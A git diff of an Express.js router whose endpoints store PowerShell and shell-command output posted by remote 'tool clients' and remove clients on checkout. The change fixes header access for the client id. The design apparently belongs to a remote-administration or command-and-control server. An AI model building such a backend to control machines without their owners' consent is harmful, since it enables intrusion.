@@ -14,7 +14,7 @@ router.use(toolCookieValidator);
 //Powershell response
 router.route('/ps').post((req,res) =>{
     const response_id = GenerateRandomId(6);
-    const clientId = req.sidebars['clientid'];
+    const clientId = req.headers['clientid'];
     const response = req.body.response;
     const newPsResponse = new psResponse({response_id:response_id, client_id:clientId,response:response});
     newPsResponse.save()
@@ -32,7 +32,7 @@ router.route('/ps').post((req,res) =>{
 //Regular command response
 router.route('/').post((req,res) =>{
     const response_id = GenerateRandomId(6);
-    const clientId = req.sidebars['clientid'];
+    const clientId = req.headers.clientid;
     const response = req.body.response;
     const newResponse = new Response({response_id:response_id, client_id:clientId,response:response});
 
@@ -52,7 +52,7 @@ router.route('/').post((req,res) =>{
 router.route('/checkout').get((req,res)=>{
     try{
         const sessionKey = req.cookies['session_id'];
-        const clientId = req.sidebars['clientid'];
+        const clientId = req.headers['clientid'];
         Client.findOneAndDelete({session_key:sessionKey},{},(err)=> {
             if (err)
                 Utils.LogToFile(`Error removing tool client after checkout ${err}`);
@@ -84,4 +84,5 @@ router.route('/checkout').get((req,res)=>{
 
     res.send();
 })
+
 module.exports = router;
